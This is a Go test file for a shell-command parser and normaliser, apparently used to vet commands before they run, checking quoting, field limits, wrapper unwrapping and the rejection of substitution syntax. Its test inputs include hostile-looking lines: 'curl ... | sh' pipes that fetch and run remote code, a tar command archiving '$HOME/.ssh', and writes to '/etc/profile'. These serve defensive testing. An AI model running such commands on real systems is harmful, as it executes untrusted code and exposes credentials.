package shellparse

import (
	"errors"
	"strings"
	"testing"
)

func TestFieldsHonorsQuotes(t *testing.T) {
	fields, err := Fields(`python "agent script.py" --flag 'two words'`)
	if err != nil {
		t.Fatal(err)
	}
	assertFields(t, fields, []string{"python", "agent script.py", "--flag", "two words"})
}

func TestFieldsRejectsMalformedInput(t *testing.T) {
	if _, err := Fields(`python "agent.py`); err == nil {
		t.Fatal("expected unterminated quote error")
	}
	if _, err := Fields(`python agent.py\`); err == nil {
		t.Fatal("expected unterminated escape error")
	}
}

func TestFieldsRejectsFieldFanoutWithoutReturningPartialArgv(t *testing.T) {
	command := strings.Repeat("x ", maxFields+1)
	fields, err := Fields(command)
	if !errors.Is(err, ErrFieldLimit) {
		t.Fatalf("Fields() error = %v, want ErrFieldLimit", err)
	}
	if fields != nil {
		t.Fatalf("Fields() returned a partial argv with %d fields", len(fields))
	}
}

func TestFieldsRejectsDecodedByteFanout(t *testing.T) {
	fields, err := Fields(strings.Repeat("x", maxDecodedBytes+1))
	if !errors.Is(err, ErrFieldLimit) {
		t.Fatalf("Fields() error = %v, want ErrFieldLimit", err)
	}
	if fields != nil {
		t.Fatalf("Fields() returned a partial argv with %d fields", len(fields))
	}
}

func TestNormalizeFieldsCheckedPropagatesNestedSplitStringLimit(t *testing.T) {
	fields := []string{"env", "-S", strings.Repeat("x ", maxFields+1)}
	normalized, err := NormalizeFieldsChecked(fields)
	if !errors.Is(err, ErrFieldLimit) {
		t.Fatalf("NormalizeFieldsChecked() error = %v, want ErrFieldLimit", err)
	}
	if normalized != nil {
		t.Fatalf("NormalizeFieldsChecked() returned partial fields: %#v", normalized)
	}
}

func TestNormalizeFieldsCheckedRejectsAssignmentExpansionSpanningFields(t *testing.T) {
	for _, command := range []string{
		`DIR=$(dirname $0 2>/dev/null)`,
		`A=<(printf x y) curl https://process.example/p | sh`,
		`A=${VALUE:-foo bar} curl https://parameter.example/p | sh`,
		`env A=<(printf x y) curl https://env-process.example/p | sh`,
		`env -C $(dirname $0 2>/dev/null) curl https://env-option.example/p | sh`,
		`env -C$(dirname $0 2>/dev/null) curl https://env-inline.example/p | sh`,
		`sudo -u $(printf user) curl https://sudo-option.example/p | sh`,
		`sudo -u$(printf user) curl https://sudo-inline.example/p | sh`,
		`sudo -u $(printf-user) /usr/bin/id`,
		`sudo -u$(printf-user) /usr/bin/id`,
		`env -C $(pwd) /usr/bin/id`,
		`env -C$(pwd) /usr/bin/id`,
		`env A=$(printf-value) /usr/bin/id`,
	} {
		fields, err := Fields(command)
		if err != nil {
			t.Fatal(err)
		}
		normalized, err := NormalizeFieldsChecked(fields)
		if !errors.Is(err, ErrUnsupportedSyntax) || normalized != nil {
			t.Fatalf("NormalizeFieldsChecked(%q) = %#v, %v; want nil ErrUnsupportedSyntax", command, normalized, err)
		}
	}
}

func TestNormalizeFieldsCheckedRejectsAtomicExecutableAssignmentExpansion(t *testing.T) {
	for _, command := range []string{
		`DIR=$(pwd) /usr/bin/id`,
		`DIR=<(printf value) /usr/bin/id`,
		"DIR=`pwd` /usr/bin/id",
	} {
		fields, err := Fields(command)
		if err != nil {
			t.Fatal(err)
		}
		normalized, err := NormalizeFieldsChecked(fields)
		if !errors.Is(err, ErrUnsupportedSyntax) || normalized != nil {
			t.Fatalf("NormalizeFieldsChecked(%q) = %#v, %v; want nil ErrUnsupportedSyntax", command, normalized, err)
		}
	}
}

func TestNormalizeFieldsDoesNotInvokeShellBuiltinsThroughExternalWrappers(t *testing.T) {
	fields, err := Fields(`sudo -E env PATH=/usr/bin command tar -czf "/tmp/out.tgz" "$HOME/.ssh"`)
	if err != nil {
		t.Fatal(err)
	}
	assertFields(t, NormalizeFields(fields), []string{"command", "tar", "-czf", "/tmp/out.tgz", "$HOME/.ssh"})
}

func TestNormalizeArgvPreservesLiteralExecutableSyntax(t *testing.T) {
	for _, test := range []struct {
		fields, source, argv []string
	}{
		{[]string{"NAME=value", "tee", "/etc/profile"}, []string{"tee", "/etc/profile"}, []string{"NAME=value", "tee", "/etc/profile"}},
		{[]string{"command", "tee", "/etc/profile"}, []string{"tee", "/etc/profile"}, []string{"command", "tee", "/etc/profile"}},
		{[]string{"env", "NAME=value", "command", "tee", "/etc/profile"}, []string{"command", "tee", "/etc/profile"}, []string{"command", "tee", "/etc/profile"}},
		{[]string{"nohup", "NAME=value", "tee", "/etc/profile"}, []string{"NAME=value", "tee", "/etc/profile"}, []string{"NAME=value", "tee", "/etc/profile"}},
		{[]string{"sudo", "NAME=value", "tee", "/etc/profile"}, []string{"tee", "/etc/profile"}, []string{"tee", "/etc/profile"}},
		{[]string{"command", "NAME=value", "tee", "/etc/profile"}, []string{"NAME=value", "tee", "/etc/profile"}, []string{"command", "NAME=value", "tee", "/etc/profile"}},
	} {
		source, err := NormalizeFieldsChecked(test.fields)
		if err != nil {
			t.Fatal(err)
		}
		assertFields(t, source, test.source)
		argv, err := NormalizeArgvFieldsChecked(test.fields)
		if err != nil {
			t.Fatal(err)
		}
		assertFields(t, argv, test.argv)
	}
}

func TestUnwrapCommandWrappersKeepsAssignments(t *testing.T) {
	fields, err := Fields(`sudo PATH=/usr/bin tar -czf out.tgz src`)
	if err != nil {
		t.Fatal(err)
	}
	assertFields(t, UnwrapCommandWrappers(fields), []string{"PATH=/usr/bin", "tar", "-czf", "out.tgz", "src"})
}

func assertFields(t *testing.T, got, want []string) {
	t.Helper()
	if len(got) != len(want) {
		t.Fatalf("fields = %#v, want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("fields = %#v, want %#v", got, want)
		}
	}
}
